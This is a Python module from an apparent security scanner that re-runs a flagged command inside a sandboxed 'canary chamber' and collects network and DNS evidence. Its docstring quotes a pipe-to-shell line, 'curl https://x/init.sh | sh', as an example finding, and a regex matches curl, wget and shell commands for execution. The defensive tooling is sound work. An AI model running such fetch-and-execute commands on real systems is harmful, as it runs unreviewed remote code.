"""Ad-hoc one-shot detonation probe: re-run a single flagged command in the
canary chamber, independent of any audit.

This powers the "detonate this finding" button: the user sees a static or
semantic finding (e.g. ``curl https://x/init.sh | sh`` flagged in a BUILD.md),
and wants execution-based evidence *now* — without re-auditing the whole
target. We rebuild a minimal chamber around just that command:

- target dir  : a fresh empty temp dir (the command under probe carries
                itself; there is nothing to mount)
- trigger     : the command extracted from the finding's evidence excerpt
                (fallback: the finding title as free text)
- canary env  : fresh per-probe canary credentials
- collectors  : same mitm + DNS capture as full detonation

Evidence mapping is shared with the audit pipeline (``evidence_to_findings``),
so probe results speak the same language as audit findings.
"""
from __future__ import annotations

import re
import shlex
import tempfile
from dataclasses import dataclass
from pathlib import Path

from fugu.types import Finding


# Command-ish lines we are willing to execute. The probe is explicitly
# user-initiated ("detonate this finding"), so free-text descriptions are
# accepted too — the chamber is the safety boundary, not this filter.
_CMD_LINE = re.compile(r"(curl|wget|bash|sh|npm|npx|pip|python|node)[^\n]{4,300}")


def command_from_finding(finding: Finding) -> str | None:
    """Best-effort: extract the flagged command from a finding.

    Priority: evidence excerpts (they quote the exact flagged line), then the
    title/detail text. Returns None when nothing command-shaped is found.
    """
    candidates: list[str] = []
    for ev in finding.evidence:
        if ev.excerpt:
            # evidence lines look like "L12 curl https://... | sh" — strip
            # line-number prefixes before matching
            line = re.sub(r"^L\d+\s*", "", ev.excerpt.strip())
            candidates.append(line)
    for text in (finding.title, finding.detail):
        if text:
            candidates.append(text)

    for cand in candidates:
        m = _CMD_LINE.search(cand)
        if m:
            cmd = m.group(0).strip().rstrip("`\u00b4\"'")
            try:
                shlex.quote(cmd)  # sanity: parseable
            except ValueError:
                continue
            return cmd
    return None


@dataclass
class ProbeResult:
    ok: bool
    trigger: str
    findings: list[Finding]
    metrics: dict


async def run_probe(finding: Finding, timeout_s: int = 60) -> ProbeResult:
    """Detonate one finding's command in a fresh chamber. Never raises for
    chamber-internal issues; ``ok=False`` + error finding carries failures."""
    cmd = command_from_finding(finding)
    if cmd is None:
        return ProbeResult(
            ok=False,
            trigger="",
            findings=[],
            metrics={"error": "no executable command found in finding"},
        )

    from fugu.detonation.docker_driver import DockerDriver, evidence_to_findings

    driver = DockerDriver()
    with tempfile.TemporaryDirectory(prefix="fugu-probe-") as td:
        try:
            evidences = await driver.detonate(
                Path(td), [cmd], timeout_s=timeout_s
            )
        except Exception as exc:  # noqa: BLE001 - probe failures are results
            return ProbeResult(
                ok=False,
                trigger=cmd,
                findings=[],
                metrics={"error": f"{type(exc).__name__}: {exc}"},
            )

    findings: list[Finding] = []
    for ev in evidences:
        findings.extend(evidence_to_findings(ev))
    return ProbeResult(
        ok=True,
        trigger=cmd,
        findings=findings,
        metrics={
            "detonations": len(evidences),
            "canary_hits": sum(len(e.canary_hits) for e in evidences),
            "flows": sum(len(e.flows) for e in evidences),
            "dns": sum(len(e.dns) for e in evidences),
        },
    )
